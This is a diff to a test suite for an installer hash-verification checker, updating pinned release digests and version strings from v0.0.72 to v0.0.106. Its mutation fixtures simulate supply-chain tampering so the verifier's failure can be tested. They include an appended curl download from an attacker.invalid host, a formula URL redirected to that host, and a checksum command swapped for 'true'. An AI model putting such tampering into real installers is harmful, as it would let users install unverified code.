@@ -43,41 +43,7 @@ const TRUSTED_PARSER_TEMPLATE = fs.readFileSync(
   path.join(REPO_ROOT, "scripts/checks/extract-installer-pins.mts"),
   "utf8",
 );
-const ASSET_DIGESTS = new Map([
-  [
-    "openshell-x86_64-unknown-linux-musl.tar.gz",
-    "37836c3b50383e03249c5e16512c1806e591fba8451408a84fb2f628ddb318c4",
-  ],
-  [
-    "openshell-aarch64-unknown-linux-musl.tar.gz",
-    "a5ff01a3240d73c72ec1700eda6cc6c752a86cf50c5dd1b5bdc459f544d03045",
-  ],
-  [
-    "openshell-aarch64-apple-darwin.tar.gz",
-    "117b5354cc42d80bc4d5e070ea5ac4e341208ff6d3c29b516d8a9c80e2310f8d",
-  ],
-  [
-    "openshell-gateway-x86_64-unknown-linux-gnu.tar.gz",
-    "03225fb9388b682af1a5f1614b26b75f828da6031e3ffc1fd920b6fbe5f70877",
-  ],
-  [
-    "openshell-gateway-aarch64-unknown-linux-gnu.tar.gz",
-    "a97dcb3acb04fb2d1170c1a2170228990c2337e25bb8c18817e5a6e952204108",
-  ],
-  [
-    "openshell-gateway-aarch64-apple-darwin.tar.gz",
-    "8c07362107393eb5f4ae4b9ee9f4257fd53862c51ad8dd96f2fe31bb6d8d7ffb",
-  ],
-  [
-    "openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz",
-    "811f914b6a6a3a3f4533449ddebebb6422333861a27a5fa848db6cbfdffdd230",
-  ],
-  [
-    "openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz",
-    "2cf62cbd651e55d0f8750804e2b4025e0d6c8eea4564c87cda47a2c922941db0",
-  ],
-  ["openshell.rb", "4b75a7e3a7630eb8954d73ca828b394d5e0646adbaa4b087b2435329d53b61b3"],
-]);
+const ASSET_DIGESTS = V00106_ASSET_DIGESTS;
 const FORMULA_ASSET = "openshell.rb";
 const FORMULA_DIGEST = ASSET_DIGESTS.get(FORMULA_ASSET)!;
 const SYNTHETIC_SUPERVISOR_MANIFEST_DIGEST = `sha256:${"c".repeat(64)}`;
@@ -218,22 +184,22 @@ const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> =
   },
   "missing-brev-pin": (source) =>
     source.replace(ASSET_DIGESTS.get(ASSETS[1]) ?? "missing", "missing"),
-  "mismatched-table-versions": (source) => source.replaceAll("v0.0.72:", "v0.0.73:"),
+  "mismatched-table-versions": (source) => source.replaceAll("v0.0.106:", "v0.0.107:"),
   "official-but-unexpected-brev-asset": (source) =>
     source
-      .replace(`v0.0.72:${ASSETS[1]})`, `v0.0.72:${OFFICIAL_UNEXPECTED_BREV_ASSET})`)
+      .replace(`v0.0.106:${ASSETS[1]})`, `v0.0.106:${OFFICIAL_UNEXPECTED_BREV_ASSET})`)
       .replace(ASSET_DIGESTS.get(ASSETS[1] ?? "") ?? "missing", OFFICIAL_UNEXPECTED_BREV_DIGEST),
   "pr-checker-bypass": corruptFirstBrevPin,
   "pr-parser-bypass": corruptFirstBrevPin,
   "brev-stable-version-drift": (source) =>
     source.replace(
-      'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
-      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
+      'stable | auto) OPENSHELL_VERSION="v0.0.106" ;;',
+      'stable | auto) OPENSHELL_VERSION="v0.0.107" ;;',
     ),
   "runtime-consumers-newer-than-tables": (source) =>
     source.replace(
-      'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
-      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
+      'stable | auto) OPENSHELL_VERSION="v0.0.106" ;;',
+      'stable | auto) OPENSHELL_VERSION="v0.0.107" ;;',
     ),
 };
 const mutateSandboxBuildFunction = (
@@ -274,7 +240,7 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
   "duplicate-installer-pin": (source) => {
     const asset = ASSETS[0];
     const digest = ASSET_DIGESTS.get(asset ?? "") ?? "missing";
-    const arm = `    v0.0.72:${asset})
+    const arm = `    v0.0.106:${asset})
       printf '%s\\n' "${digest}"
       ;;`;
     assert.ok(source.includes(arm), "installer duplicate-pin fixture arm must exist");
@@ -319,7 +285,7 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
       'attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
     ),
   "installer-dev-min-version-drift": (source) =>
-    source.replace('DEV_MIN_VERSION="0.0.72"', 'DEV_MIN_VERSION="0.0.85"'),
+    source.replace('DEV_MIN_VERSION="0.0.106"', 'DEV_MIN_VERSION="0.0.107"'),
   "installer-extra-download": (source) =>
     `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
   "installer-indirect-selector-override": (source) =>
@@ -329,7 +295,7 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
   "installer-literalized-pin-input": (source) =>
     source.replace('local release_tag="$1" asset="$2"', "local release_tag='$1' asset='$2'"),
   "installer-min-version-drift": (source) =>
-    source.replace('MIN_VERSION="0.0.72"', 'MIN_VERSION="0.0.85"'),
+    source.replace('MIN_VERSION="0.0.106"', 'MIN_VERSION="0.0.107"'),
   "installer-homebrew-trust-transition-complete-current": (source) =>
     source.replace(
       "readonly OPENSHELL_HOMEBREW_FORMULA_ABSENT=65",
@@ -351,13 +317,13 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
       "if false; then",
     ),
   "installer-max-version-drift": (source) =>
-    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
+    source.replace('MAX_VERSION="0.0.106"', 'MAX_VERSION="0.0.107"'),
   "installer-pin-selector-drift": (source) =>
-    source.replace('PIN_VERSION="$MAX_VERSION"', 'PIN_VERSION="0.0.72"'),
+    source.replace('PIN_VERSION="$MAX_VERSION"', 'PIN_VERSION="0.0.106"'),
   "installer-sha-command-bypass": (source) =>
     source.replace('SHA_CMD="sha256sum"', 'SHA_CMD="true"'),
   "multiple-installer-versions": (source) =>
-    source.replace(`v0.0.72:${ASSETS[0]}`, `v0.0.73:${ASSETS[0]}`),
+    source.replace(`v0.0.106:${ASSETS[0]}`, `v0.0.107:${ASSETS[0]}`),
   "official-but-unexpected-installer-asset": (source) =>
     source
       .replace(ASSETS.at(-1) ?? "missing", OFFICIAL_UNEXPECTED_INSTALLER_ASSET)
@@ -368,7 +334,7 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
   "partial-asset-missing": (source) =>
     source.replace(ASSETS.at(-1) ?? "missing", UNPUBLISHED_ASSET),
   "runtime-consumers-newer-than-tables": (source) =>
-    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
+    source.replace('MAX_VERSION="0.0.106"', 'MAX_VERSION="0.0.107"'),
 };
 
 type InputMutationContext = {
@@ -380,7 +346,7 @@ type InputMutationContext = {
 const INPUT_MUTATIONS: Partial<Record<FixtureMode, (context: InputMutationContext) => void>> = {
   "runtime-consumers-newer-than-tables": ({ blueprint }) => {
     const source = fs.readFileSync(blueprint, "utf8");
-    fs.writeFileSync(blueprint, source.replace('"0.0.72"', '"0.0.85"'));
+    fs.writeFileSync(blueprint, source.replace('"0.0.106"', '"0.0.107"'));
   },
   "non-regular-brev-input": ({ brevInstaller }) => {
     fs.rmSync(brevInstaller);
@@ -406,40 +372,7 @@ const INPUT_MUTATIONS: Partial<Record<FixtureMode, (context: InputMutationContex
     fs.symlinkSync(scriptsTarget, candidateScriptsDir, "dir");
   },
 };
-const CHECKSUM_MANIFESTS = new Map([
-  [
-    "openshell-checksums-sha256.txt",
-    `37836c3b50383e03249c5e16512c1806e591fba8451408a84fb2f628ddb318c4  openshell-x86_64-unknown-linux-musl.tar.gz
-a5ff01a3240d73c72ec1700eda6cc6c752a86cf50c5dd1b5bdc459f544d03045  openshell-aarch64-unknown-linux-musl.tar.gz
-117b5354cc42d80bc4d5e070ea5ac4e341208ff6d3c29b516d8a9c80e2310f8d  openshell-aarch64-apple-darwin.tar.gz
-911dd804074c620b3ba353f17e39a8195222c0764072621a154164432d7906d0  openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz
-5e6ba04030938e7be21b8b83af9a34b888deffb4c65e7e70dd6845c3bc7e264f  openshell-driver-vm-aarch64-unknown-linux-gnu.tar.gz
-cdcdf0d0b5a231c0c7631787de014462093ffdeb5c85de853594fd215b0fa98a  openshell-driver-vm-aarch64-apple-darwin.tar.gz
-f4807cdaf3598c1fbcd0f35c888bf7f42210e1f4ab27700a1200d5bf80e56e9a  openshell_0.0.72-1_amd64.deb
-e38eca3badbba827c7342e2d738b277c8714081a54700ce4dc6c5395e1608d6b  openshell_0.0.72-1_arm64.deb
-626aa3c781027231a2085ebbdb5a4e2ae88c1c0977bfb1fd7ddaab501efe37c5  openshell-0.0.72-1.fc44.aarch64.rpm
-abca83026aa8192a82c54316e6f15f38583fdd59d936535d07fe7bb5e6824a32  openshell-0.0.72-1.fc44.x86_64.rpm
-cf349d3cd5fb5f05419ee088a4784206ce117af07f427e0667290955659c7530  openshell-gateway-0.0.72-1.fc44.aarch64.rpm
-523087b888d6641a1798c3400492028d5c236870f321ab87d28918e3ae523c20  openshell-gateway-0.0.72-1.fc44.x86_64.rpm
-fc590490e1a89c00b8f95b5449de9107cb9f070bd4a8cefb0f2389baf0d95f67  openshell-0.0.72-py3-none-macosx_13_0_arm64.whl
-e104152e6840dc2bed10856251ed6b3a020ed5f5550e735a325028a0990b475b  openshell-0.0.72-py3-none-manylinux_2_39_aarch64.whl
-c7feaca0c8c97ace952bd047408a91732fbcb298517481152d8e53d49c5fc88f  openshell-0.0.72-py3-none-manylinux_2_39_x86_64.whl
-`,
-  ],
-  [
-    "openshell-gateway-checksums-sha256.txt",
-    `03225fb9388b682af1a5f1614b26b75f828da6031e3ffc1fd920b6fbe5f70877  openshell-gateway-x86_64-unknown-linux-gnu.tar.gz
-a97dcb3acb04fb2d1170c1a2170228990c2337e25bb8c18817e5a6e952204108  openshell-gateway-aarch64-unknown-linux-gnu.tar.gz
-8c07362107393eb5f4ae4b9ee9f4257fd53862c51ad8dd96f2fe31bb6d8d7ffb  openshell-gateway-aarch64-apple-darwin.tar.gz
-`,
-  ],
-  [
-    "openshell-sandbox-checksums-sha256.txt",
-    `811f914b6a6a3a3f4533449ddebebb6422333861a27a5fa848db6cbfdffdd230  openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz
-2cf62cbd651e55d0f8750804e2b4025e0d6c8eea4564c87cda47a2c922941db0  openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz
-`,
-  ],
-]);
+const CHECKSUM_MANIFESTS = V00106_CHECKSUM_MANIFESTS;
 const CHECKSUM_MANIFESTS_BY_VERSION = new Map([
   ["0.0.99", V0099_CHECKSUM_MANIFESTS],
   ["0.0.101", V00101_CHECKSUM_MANIFESTS],
@@ -474,23 +407,26 @@ const CHECKER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>
   "duplicate-trusted-formula": (source) =>
     source.replace(
       "readonly -a OPENSHELL_RELEASE_FORMULA_ALLOWLIST=(\n",
-      `readonly -a OPENSHELL_RELEASE_FORMULA_ALLOWLIST=(\n  "0.0.72|openshell.rb|https://github.com/NVIDIA/OpenShell/releases/download/v0.0.72/openshell.rb|${FORMULA_DIGEST}"\n`,
+      `readonly -a OPENSHELL_RELEASE_FORMULA_ALLOWLIST=(\n  "0.0.106|openshell.rb|https://github.com/NVIDIA/OpenShell/releases/download/v0.0.106/openshell.rb|${FORMULA_DIGEST}"\n`,
     ),
   "incomplete-trusted-allowlist": (source) =>
     source.replace(
-      /^\s*"0\.0\.72\|openshell-sandbox-checksums-sha256\.txt\|[a-f0-9]{64}"\s*$/m,
+      /^\s*"0\.0\.106\|openshell-sandbox-checksums-sha256\.txt\|[a-f0-9]{64}"\s*$/m,
       "",
     ),
   "malformed-trusted-formula": (source) =>
-    source.replace(`v0.0.72/openshell.rb|${FORMULA_DIGEST}`, "v0.0.72/openshell.rb|invalid"),
+    source.replace(
+      `v0.0.106/openshell.rb|${FORMULA_DIGEST}`,
+      "v0.0.106/openshell.rb|invalid",
+    ),
   "mismatched-trusted-formula-url": (source) =>
     source.replace(
-      "https://github.com/NVIDIA/OpenShell/releases/download/v0.0.72/openshell.rb",
+      "https://github.com/NVIDIA/OpenShell/releases/download/v0.0.106/openshell.rb",
       "https://attacker.invalid/openshell.rb",
     ),
   "missing-trusted-formula": (source) =>
     source.replace(
-      /^\s*"0\.0\.72\|openshell\.rb\|https:\/\/github\.com\/NVIDIA\/OpenShell\/releases\/download\/v0\.0\.72\/openshell\.rb\|[a-f0-9]{64}"\s*$/m,
+      /^\s*"0\.0\.106\|openshell\.rb\|https:\/\/github\.com\/NVIDIA\/OpenShell\/releases\/download\/v0\.0\.106\/openshell\.rb\|[a-f0-9]{64}"\s*$/m,
       "",
     ),
   "trusted-formula-mismatch": (source) => source.replace(FORMULA_DIGEST, "0".repeat(64)),
@@ -746,7 +682,7 @@ function renderSupervisorRuntime(openshellVersion: string): string {
 }
 
 function createFixture(
-  openshellVersion = "0.0.72",
+  openshellVersion = "0.0.106",
   formatting: PinFormatting = "canonical",
 ): string {
   const checksumManifests =
@@ -1015,7 +951,7 @@ describe("installer hash verification", () => {
 
     expect(result.status).toBe(1);
     expect(result.stdout).toContain(
-      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
+      "STALE: installer openshell.rb does not match the base-trusted v0.0.106 formula digest",
     );
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
@@ -1025,7 +961,7 @@ describe("installer hash verification", () => {
 
     expect(result.status).toBe(1);
     expect(result.stdout).toContain(
-      "STALE: installer openshell.rb pin does not match the base-trusted v0.0.72 formula digest",
+      "STALE: installer openshell.rb pin does not match the base-trusted v0.0.106 formula digest",
     );
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
@@ -1035,7 +971,7 @@ describe("installer hash verification", () => {
 
     expect(result.status).toBe(1);
     expect(result.stdout).toContain(
-      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
+      "STALE: installer openshell.rb does not match the base-trusted v0.0.106 formula digest",
     );
     expect(result.stdout).toContain(`trusted:  ${FORMULA_DIGEST}`);
     expect(result.stdout).toContain(`upstream: ${"0".repeat(64)}`);
@@ -1046,7 +982,7 @@ describe("installer hash verification", () => {
     const result = runFixture("complete", undefined, true);
 
     expect(result.status).toBe(0);
-    expect(result.stdout).toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).toContain("All installer hashes are current");
   });
 
@@ -1171,9 +1107,9 @@ describe("installer hash verification", () => {
 
     expect(result.status).toBe(1);
     expect(result.stdout).toContain(
-      "OpenShell v0.0.72 does not have exactly three trusted release-manifest digests",
+      "OpenShell v0.0.106 does not have exactly three trusted release-manifest digests",
     );
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
@@ -1185,9 +1121,9 @@ describe("installer hash verification", () => {
 
     expect(result.status).toBe(1);
     expect(result.stdout).toContain(
-      "OpenShell v0.0.72 does not have exactly one trusted openshell.rb digest",
+      "OpenShell v0.0.106 does not have exactly one trusted openshell.rb digest",
     );
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
@@ -1199,7 +1135,7 @@ describe("installer hash verification", () => {
 
     expect(result.status).toBe(1);
     expect(result.stdout).toContain("trusted OpenShell formula allowlist is invalid");
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
@@ -1208,7 +1144,7 @@ describe("installer hash verification", () => {
 
     expect(result.status).toBe(1);
     expect(result.stdout).toContain(
-      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
+      "STALE: installer openshell.rb does not match the base-trusted v0.0.106 formula digest",
     );
     expect(result.stdout).toContain(`trusted:  ${"0".repeat(64)}`);
     expect(result.stdout).toContain(`upstream: ${FORMULA_DIGEST}`);
@@ -1221,28 +1157,28 @@ describe("installer hash verification", () => {
     expect(result.status).toBe(1);
     expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
     expect(result.stdout).toContain(
-      "installer pin-table release 0.0.72 must match blueprint max_openshell_version 0.0.85",
+      "installer pin-table release 0.0.106 must match blueprint max_openshell_version 0.0.107",
     );
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
   it.each([
     [
       "installer-min-version-drift",
-      "installer pin-table release 0.0.72 must match installer MIN_VERSION 0.0.85",
+      "installer pin-table release 0.0.106 must match installer MIN_VERSION 0.0.107",
     ],
     [
       "installer-max-version-drift",
-      "installer pin-table release 0.0.72 must match installer MAX_VERSION 0.0.85",
+      "installer pin-table release 0.0.106 must match installer MAX_VERSION 0.0.107",
     ],
     [
       "installer-dev-min-version-drift",
-      "installer pin-table release 0.0.72 must match installer DEV_MIN_VERSION 0.0.85",
+      "installer pin-table release 0.0.106 must match installer DEV_MIN_VERSION 0.0.107",
     ],
     [
       "brev-stable-version-drift",
-      "installer pin-table release 0.0.72 must match Brev stable OpenShell default 0.0.85",
+      "installer pin-table release 0.0.106 must match Brev stable OpenShell default 0.0.107",
     ],
     ["installer-pin-selector-drift", "installer operational template is not base-trusted"],
   ] as const)("rejects %s", (mode, diagnostic) => {
@@ -1289,7 +1225,7 @@ describe("installer hash verification", () => {
     expect(result.status).toBe(1);
     expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
     expect(result.stdout).toContain(diagnostic);
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
@@ -1304,11 +1240,11 @@ describe("installer hash verification", () => {
     ],
     [
       "multiple-installer-versions",
-      "openshell_pinned_sha256 must contain exactly one release version, found 0.0.72, 0.0.73",
+      "openshell_pinned_sha256 must contain exactly one release version, found 0.0.106, 0.0.107",
     ],
     [
       "mismatched-table-versions",
-      "installer and Brev launchable pin tables must use the same release version, found 0.0.72, 0.0.73",
+      "installer and Brev launchable pin tables must use the same release version, found 0.0.106, 0.0.107",
     ],
   ] as const)("fails closed for %s", (mode, diagnostic) => {
     const result = runFixture(mode, undefined, true);
@@ -1316,7 +1252,7 @@ describe("installer hash verification", () => {
     expect(result.status).toBe(1);
     expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
     expect(result.stdout).toContain(diagnostic);
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
@@ -1338,7 +1274,7 @@ describe("installer hash verification", () => {
     expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
     expect(result.stdout).toContain(diagnostic);
     expect(result.stdout).toContain(`unexpected=[${unexpected}]`);
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
@@ -1433,7 +1369,7 @@ describe("installer hash verification", () => {
     const result = runFixture("failure");
 
     expect(result.status).not.toBe(0);
-    expect(result.stdout).toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).toContain("15 OpenShell release-asset check(s) failed");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
@@ -1442,7 +1378,7 @@ describe("installer hash verification", () => {
     const result = runFixture("partial");
 
     expect(result.status).toBe(1);
-    expect(result.stdout).toContain("digest does not match the pinned v0.0.72 release asset");
+    expect(result.stdout).toContain("digest does not match the pinned v0.0.106 release asset");
     expect(result.stdout).toContain("expected all 11 pinned asset references");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
@@ -1469,7 +1405,7 @@ describe("installer hash verification", () => {
       "installer pin table must contain the exact consumed asset set",
     );
     expect(result.stdout).toContain(`unexpected=[${UNPUBLISHED_ASSET}]`);
-    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
+    expect(result.stdout).not.toContain("Checking OpenShell v0.0.106 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
   });
 
